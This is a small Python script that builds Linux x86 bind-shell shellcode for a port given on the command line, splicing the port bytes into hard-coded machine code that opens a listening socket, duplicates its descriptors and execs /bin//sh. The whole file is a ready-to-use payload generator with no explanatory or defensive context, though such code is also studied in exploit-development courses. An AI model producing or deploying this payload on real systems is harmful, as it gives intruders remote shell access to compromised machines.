#/bin/python3

import sys
import socket
import struct

shellcode1 = "\\x31\\xdb\\xf7\\xe3\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x02\\x51\\x66\\x68"
# shellcode_port += "\\x05\\x39"
shellcode2 = "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x04\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x05\\x51\\x51\\x57\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"

if not len(sys.argv) == 2:
    print(f"Usage: python3 {sys.argv[0]} <port>")
    sys.exit()

port = sys.argv[1]

# convert to network byte order and hex
# port = hex(socket.htons(int(port)))[2:].zfill(4)
port = struct.pack("!i", int(port)).hex()
port_byte1 = port[len(port)-4:len(port)-2]
port_byte2 = port[len(port)-2:]
print(f"port: \\x{port_byte1}\\x{port_byte2}")
shellcode = shellcode1 + f"\\x{port_byte1}\\x{port_byte2}" + shellcode2
print(shellcode)